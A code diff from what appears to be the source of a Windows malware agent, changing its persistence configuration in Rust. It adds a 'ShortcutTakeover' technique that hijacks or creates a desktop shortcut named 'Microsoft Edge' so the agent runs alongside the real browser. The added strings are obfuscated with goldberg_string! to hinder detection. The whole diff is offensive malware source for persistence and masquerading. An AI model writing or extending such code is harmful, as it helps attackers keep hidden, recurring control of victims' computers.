@@ -34,12 +34,12 @@ pub enum Persistence {
     // system run an agent on startup.
     WindowsRegistry,
 
-    // Modifies shortcuts of a program to point to an
-    // agent in order to assure execution when a user
-    // runs that shortcut. This would also run program
-    // to which shortcut was initially pointing to.
-    // Highly recommended to enable mutex utilization
-    // when relying on this technique.
+    // Modifies or creates shortcut of a program to 
+    // point to an agent in order to assure execution
+    // when a user runs that shortcut. This would also 
+    // run program to which shortcut was initially
+    // pointing to. Highly recommended to enable mutex
+    // utilization when relying on this technique.
     ShortcutTakeover,
 }
 
@@ -49,9 +49,23 @@ pub fn persistence() -> Persistence {
     return Persistence::ShortcutTakeover;
 }
 
-// Relates to Persistence::WinRegistryBased
+// Relates to Persistence::WinRegistryBased.
 // Specifies name of the registry record.
 #[inline]
 pub fn get_reg_program_name() -> String {
     goldberg_string!("Agent").to_string()
+}
+
+// Relates to Persistence::ShortcutTakeover.
+// Specifies which program would be run (apart from
+// the agent) when you run the shortcut.
+pub fn get_lnk_target_program_path() -> String {
+    goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe").to_string()
+}
+
+// Relates to Persistence::ShortcutTakeover.
+// Specifies name of the shortcut. Shortcut
+// is assumed to live on the desktop.
+pub fn get_lnk_shortcut_name() -> String {
+    goldberg_string!("Microsoft Edge").to_string()
 }
